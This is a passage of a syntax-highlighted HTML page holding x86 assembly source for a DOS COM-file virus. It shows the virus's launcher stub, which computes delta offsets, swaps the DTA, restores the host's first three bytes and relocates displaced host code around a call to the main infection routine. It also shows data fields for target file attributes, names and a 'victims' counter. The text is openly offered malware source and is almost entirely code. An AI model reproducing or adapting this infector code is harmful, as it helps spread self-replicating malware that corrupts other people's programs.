</span><span class="sc5">startP3</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">; Program code that has been moved to accomodate our virus</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">   </span><span class="sc5">V1Length</span><span class="sc0">  </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">endP3</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc5">startV2</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">; Virus's little launching pad.</span><span class="sc0">
</span><span class="sc5">V2Length</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">  </span><span class="sc5">endV2</span><span class="sc4">-</span><span class="sc5">startv2</span><span class="sc0">

</span><span class="sc1">; Pretty cut and dry delta offset thing</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Delta</span><span class="sc0">               </span><span class="sc1">; Gets delta offsets</span><span class="sc0">
</span><span class="sc5">Delta</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">bp</span><span class="sc0">                  </span><span class="sc1">; Retrieve Locale for BP</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Delta</span><span class="sc0">     </span><span class="sc1">; Subtracts that by the original to obtain</span><span class="sc0">
                         </span><span class="sc1">; the location moved down in memory</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">                   </span><span class="sc1">; Set new DTA, this is a first for me</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">New_Dta</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">; Rewrite first three bytes</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">saved</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Where we saved em</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                  </span><span class="sc1">; Start of Program, ( i.e. where they go )</span><span class="sc0">
</span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc6">movsw</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">BufferP3</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; This block moves P3 code into the buffer so the</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">StartP3</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; when the virus runs, it doesn't get overwritten</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">V1Length</span><span class="sc0">         </span><span class="sc1">; Length of that area</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0">  </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">; Move it out!!</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">StartV1</span><span class="sc0">                  </span><span class="sc1">; Normal Virus Code</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">BufferP3</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Loads start of moved program code into SI</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">startV1</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Virus location into DI</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">V1length</span><span class="sc0">         </span><span class="sc1">; Virus code length</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0">  </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">; Restores bytes</span><span class="sc0">

</span><span class="sc1">; Restores the saved DTA</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">    </span><span class="sc1">; Set original DTA</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc1">; We are gonna run the host program now</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">       </span><span class="sc1">; Go for it</span><span class="sc0">

</span><span class="sc5">endV2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">Buffer</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">New_Dta</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">21</span><span class="sc0">   </span><span class="sc9">dup</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; DTA!!</span><span class="sc0">
</span><span class="sc5">Attributes</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">File_time</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">File_date</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">File_size</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">File_size_off</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">File_name</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">13</span><span class="sc0">  </span><span class="sc9">dup</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">victims</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">0h</span><span class="sc0">        </span><span class="sc1">; Victim count</span><span class="sc0">
</span><span class="sc5">Cur_DIR</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">64</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">; Location of current DIR</span><span class="sc0">
</span><span class="sc5">BufferP3</span><span class="sc4">:</span><span class="sc0">
</span></div></body>
</html>
